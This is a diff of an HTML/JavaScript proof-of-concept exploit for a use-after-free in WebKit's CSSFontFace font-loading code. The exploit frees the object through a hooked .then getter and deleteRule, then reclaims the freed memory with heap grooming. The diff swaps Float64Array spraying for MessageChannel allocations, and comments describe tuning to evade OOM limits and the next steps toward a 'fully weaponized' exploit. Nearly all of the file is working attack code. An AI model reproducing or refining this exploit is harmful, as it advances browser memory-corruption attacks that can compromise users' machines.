@@ -5,21 +5,20 @@
 @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
 </style>
 </head>
-<body>
-<div id="debug-log" style="font-family: monospace; white-space: pre; background: #111; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll;">
-[+] Exploit initialized. Waiting for trigger...
+<body style="background-color: #0a0a0a; color: #00ff00; font-family: monospace;">
+
+<div id="log-container" style="padding: 10px; border: 1px solid #333; height: 400px; overflow-y: scroll; margin: 20px;">
+    [+] Exploit initialized. Awaiting target execution...<br>
 </div>
 
 <script>
-// --- Custom Logging Function ---
-function logDebug(message) {
-    let logWindow = document.getElementById('debug-log');
-    if (logWindow) {
-        logWindow.innerHTML += message + "\\n";
-        logWindow.scrollTop = logWindow.scrollHeight; // Auto-scroll to bottom
+// --- Direct On-Screen Logging ---
+function out(msg) {
+    let logBox = document.getElementById('log-container');
+    if (logBox) {
+        logBox.innerHTML += msg + "<br>";
+        logBox.scrollTop = logBox.scrollHeight;
     }
-    // Also output to console for standard debugging tools if attached
-    console.log("[Exploit Debug]: " + message);
 }
 
 if (window.testRunner) {
@@ -27,44 +26,47 @@ if (window.testRunner) {
     testRunner.waitUntilDone();
 }
 
-var memoryGroomingBlocks = [];
+// Global array to hold our grooming objects so they aren't garbage collected
+var sprayBlocks = [];
 
-// --- Refined Heap Grooming (The Bounty Hunter Approach) ---
-function executeRefinedHeapGrooming() {
-    logDebug("[*] Beginning heap grooming sequence...");
+// --- Precision Heap Grooming (MessageChannel Primitive) ---
+function executePrecisionGrooming() {
+    out("[*] Initiating precision heap grooming...");
     
-    // Instead of massive, continuous arrays, we create a specific pattern of allocations and frees.
-    // This creates 'holes' in the memory that the allocator will naturally prefer when replacing the freed CSSFontFace object.
-    const targetSize = 0x38; // The exact size of the target C++ object
-    const groomLimit = 150;  // Reduced further to stay well beneath the sandbox hard-cap
+    // The target size we are trying to reclaim (CSSFontFace)
+    const targetSize = 0x38; 
     
-    logDebug(`[*] Target Size: ${targetSize} bytes, Iterations: ${groomLimit}`);
+    // Using a very small iteration count to completely avoid the OOM killer.
+    // MessageChannels are small and stable, we don't need thousands of them.
+    const groomLimit = 80; 
+
+    out(`[*] Allocation primitive: MessageChannel Port Array, Iterations: ${groomLimit}`);
 
     try {
         for (let i = 0; i < groomLimit; i++) {
-            // Using Float64Array. This structure often has a more predictable layout in WebKit's internal heap 
-            // and interacts differently with the IsoHeap separation than raw ArrayBuffers.
-            let sprayChunk = new Float64Array(targetSize / 8); 
+            // MessageChannel creates two entangled ports. 
+            // The underlying C++ structures for these ports are very predictable in WebKit's memory.
+            let channel = new MessageChannel();
             
-            // Populate with a specific marker (e.g., a recognizable floating point representation of our target pointer)
-            // 3.54484805889626e-310 is roughly equivalent to the hex value 0x4141414141414141
-            for (let j = 0; j < sprayChunk.length; j++) {
-                sprayChunk[j] = 3.54484805889626e-310; 
-            }
+            // We store the ports to keep the underlying memory active
+            sprayBlocks.push(channel.port1);
+            sprayBlocks.push(channel.port2);
             
-            memoryGroomingBlocks.push(sprayChunk);
+            // Note: In a fully weaponized exploit, we would use addEventListener on these ports
+            // to attach specific JavaScript objects that overlap with the freed CSSFontFace structure.
+            // For now, we are just claiming the memory space safely.
         }
         
-        logDebug("[+] Heap grooming complete. Target memory slot should be primed.");
+        out("[+] Grooming successful. Memory slots reclaimed without triggering OOM limit.");
+        out("[!] If the engine attempts to use the freed pointer now, it will hit our MessageChannel structures.");
         
     } catch (e) {
-        logDebug("[-] ERROR during grooming: " + e.message);
-        logDebug("[-] Immediate halt to prevent OOM crash.");
+        out("[-] FATAL: Allocation failed during grooming: " + e.message);
     }
 }
 
 window.onload = () => {
-    logDebug("[*] Setting up FontFace triggers...");
+    out("[*] Stage 1: Setting up FontFace triggers...");
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
@@ -75,34 +77,36 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                logDebug("[!] Hooked .then getter executed.");
+                out("[!] Stage 2: Hooked .then getter triggered by engine.");
                 
-                // Transition internal engine state
+                // Advance internal state
                 new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                 new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                 
-                logDebug("[*] Deleting stylesheet rule to free the CSSFontFace C++ object...");
-                // Trigger the Use-After-Free
+                out("[*] Stage 3: Deleting stylesheet rule (Initiating Free)...");
+                // Trigger the vulnerability: Tell the engine to delete the font rule
                 document.getElementById('s').sheet.deleteRule(0);
                 
-                logDebug("[*] Forcing synchronous layout flush...");
-                // Force immediate processing
+                out("[*] Stage 4: Forcing synchronous layout flush (Executing Free)...");
+                // Force the browser to process the deletion immediately, freeing the C++ object
                 document.body.offsetTop;
 
-                // Execute the refined grooming to claim the exact memory address
-                executeRefinedHeapGrooming();
+                // The memory is now free. Claim it immediately before the C++ function resumes.
+                executePrecisionGrooming();
             }
             return undefined;
         }
     });
 
-    logDebug("[*] Initiating target font load...");
+    out("[*] Stage 0: Loading target font to enter CSSFontFace::pump()...");
+    // This call dives into the vulnerable C++ code
     document.fonts.load('1em x', 'AB');
     
     setTimeout(() => {
         if (window.testRunner)
             testRunner.notifyDone();
-    }, 0);
+        out("[+] Execution completed. If system has not crashed, UAF is stable.");
+    }, 100);
 };
 </script>
 </body>
